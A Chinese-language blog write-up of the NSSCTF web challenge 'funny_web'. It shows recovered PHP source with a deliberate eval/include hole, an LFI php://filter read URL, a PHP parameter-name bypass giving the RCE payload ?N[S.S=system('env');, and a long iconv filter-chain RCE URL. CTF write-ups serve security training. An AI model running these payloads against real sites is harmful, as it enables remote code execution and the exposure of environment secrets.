# 【NSSRound#8 Basic】funny_web


# [SWPUCTF 2022 新生赛]funny_web

## 思路

* 一上来看见一个`file=`

  ```
  http://node7.anna.nssctf.cn:28476/index.php?file=
  ```

  考虑php伪协议

  页面啥也没有，只有一个空白index.php尝试读这个php

  ```
  ?file=php://filter/read=convert.base64-encode/resource=index.php
  ```

* 读出base64编码的源码，解码得到：

  ```
  &lt;?php
  error_reporting(0);
  ​
  if (isset($_GET[&#39;N_S.S&#39;])) {
      eval($_GET[&#39;N_S.S&#39;]);
  }
  ​
  if(!isset($_GET[&#39;file&#39;])) {
      header(&#39;Location:/index.php?file=&#39;);
  } else {
      $file = $_GET[&#39;file&#39;];
  ​
      if (!preg_match(&#39;/\.\.|la|data|input|glob|global|var|dict|gopher|file|http|phar|localhost|\?|\*|\~|zip|7z|compress/is&#39;, $file)) {
          include $file;
      } else {
          die(&#39;error.&#39;);
      }
  }
  ```

  发现有GET传参`N_S.S`可以执行命令。但是一直咋传都不行。看别的师傅博客发现是一个php特性。

  &gt; [!NOTE]
  &gt;
  &gt; **一个PHP特性**
  &gt;
  &gt; 在php中变量名字是由数字字母和下划线组成的，所以不论用post还是get传入变量名的时候，php会将怪异的变量名转换成有效的
  &gt;
  &gt; 在进行解析时会**删除空白符**，并将`空格`、`&#43;`、`.`、`[` 转换为**下划线**。但是用一个特性是可以绕过的，就是当 `[` 提前出现后，`[` 会转换成下划线，而**后面的字符就不会再被转义了**。

  然后绕过这个特性用`N[S.S`

  然后可以直接用来rce

  不过唯一的问题就是这flag不在根目录

  要查环境`env`，`system(&#39;env&#39;)`

* 另一种姿势：

  利用 PHP Base64 Filter 宽松的解析，通过 `iconv filter` 等编码组合构造出特定的 PHP 代码进而完成无需**临时文件**的 RCE。来自[Gqleung佬的wp](https://www.ctfer.vip/note/set/1116)

  ```
  ?file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=index.php&amp;0=env
  ```

  

## Payload

* 
?N[S.S=system(&#39;env&#39;);
* 



## 总结

- RCE
- PHP伪协议

---

> Author: [Ting](Tin10g.github.io)  
> URL: http://localhost:1313/posts/2024%E5%81%9A%E9%A2%98-nssround%238-basicmydoor/  

